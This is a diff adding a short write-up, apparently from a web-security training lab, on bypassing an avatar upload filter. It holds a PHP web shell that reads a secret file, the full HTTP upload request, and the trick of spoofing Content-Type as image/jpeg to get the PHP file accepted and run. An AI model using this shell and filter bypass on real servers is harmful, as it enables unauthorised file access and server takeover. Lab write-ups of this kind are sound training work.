@@ -1,0 +1,65 @@
+vulnerable path: /my-account/avatar
+
+trying to upload a php file
+
+file name: lab_2_shell.php
+the script we'er gonna use
+-> 
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+<-
+
+request ->
+
+POST /my-account/avatar HTTP/2
+Host: 0a380034046730588105b7d500b6006f.web-security-academy.net
+Cookie: session=eHgu4gamZZZs3hchgX37BBoiq3FlIQ73
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------304442347211855315013388116325
+Content-Length: 550
+Origin: https://0a380034046730588105b7d500b6006f.web-security-academy.net
+Referer: https://0a380034046730588105b7d500b6006f.web-security-academy.net/my-account
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+-----------------------------304442347211855315013388116325
+Content-Disposition: form-data; name="avatar"; filename="lab_2_shell.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+-----------------------------304442347211855315013388116325
+Content-Disposition: form-data; name="user"
+
+wiener
+-----------------------------304442347211855315013388116325
+Content-Disposition: form-data; name="csrf"
+
+T3ahKMxwy3TdKZeaZUxq3TQqhny1opUN
+-----------------------------304442347211855315013388116325--
+
+<-
+response -> 
+Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
+<-
+
+send this request to the repeater
+
+upload a photo notice in the request Content-Type is set to image/jpeg
+
+back to repeater for uploading the script change Content-Type to image/jpeg
+
+response -> The file avatars/lab_2_shell.php has been uploaded. <-
+
+now let's navigate to the file
+path: /files/avatars/lab_2_shell.php
+
+reflected data: IC8kR6V21htJxpV8zJARnq9V4qOAtqG7
+
+solved
